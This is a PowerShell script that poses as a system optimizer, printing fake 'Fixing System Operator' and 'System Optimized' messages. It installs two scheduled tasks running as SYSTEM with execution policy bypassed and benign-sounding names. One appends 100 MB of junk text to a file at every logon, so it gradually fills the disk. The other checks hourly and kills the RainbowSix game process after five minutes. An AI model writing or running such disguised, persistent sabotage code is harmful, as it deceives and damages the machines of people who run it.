mkdir "C:\configWin" | out-null
mkdir "C:\configWin\assets" | out-null

$contenuto = @'
$a = "a" * 104857600 | Out-File -FilePath "C:\configWin\assets\configwind.txt" -Append
'@

$contenuto | Out-File "C:\configWin\assets\configSys.ps1"

$scriptPath = "C:\configWin\assets\configSys.ps1"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$scriptPath`""
$trigger = New-ScheduledTaskTrigger -AtLogOn -RandomDelay (New-TimeSpan -Seconds 30)
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName "CleanWinProcess" -Action $action -Trigger $trigger -Principal $principal | out-null

$contenuto1 = @'
$a = get-process | Where-Object {$_.ProcessName -eq "RainbowSix"}
if($a){
  Start-Sleep -Seconds 300
  Stop-Process -Name "RainbowSix"
}
'@

$contenuto1 | Out-File "C:\configWin\assets\configSysPush.ps1"

$scriptPath = "C:\configWin\assets\configSysPush.ps1"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$scriptPath`""
$triggers = @(
    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 0),
    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 1),
    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 2),
    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 3),
    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 4),
    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 5),
    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 6),
    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 7),
    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 8),
    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 9),
    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 10),
    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 11),
    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 12),
    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 13),
    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 14),
    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 15),
    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 16),
    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 17),
    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 18),
    New-ScheduledTaskTrigger -Daily -At (New-TimeSpan -Hours 19)
)

$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName "CleanWinProcessPush" -Action $action -Trigger $triggers -Principal $principal | out-null

Write-Host "Fixing System Operator..." -ForegroundColor "Yellow"
Start-Sleep -Seconds 20
Write-Host "Cleanup Process..." -ForegroundColor "Yellow"
Start-Sleep -Seconds 20
Write-Host "System Optimized" -ForegroundColor "Green"
